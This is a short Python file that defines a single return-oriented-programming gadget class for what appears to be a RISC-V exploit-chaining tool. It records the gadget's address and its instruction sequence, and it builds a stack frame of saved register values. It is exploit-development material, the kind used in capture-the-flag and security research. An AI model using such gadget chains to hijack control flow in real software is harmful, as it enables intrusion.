from bf_parser.rop_gadgets_base_class import ROP_Gadget

class AndA3_S0(ROP_Gadget):
    '''
    and	a3, a3, s0
    ld ra, 0x18(sp)
    ld s0, 0x10(sp)
    ld s1, 0x8(sp)
    addi sp, sp, 0x20
    jr ra
    '''
    def __init__(self):
        super().__init__(0x224f0, 0x20)

    def construct_frame(self, ra=0, s0=0, s1=0):
        data = [0, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()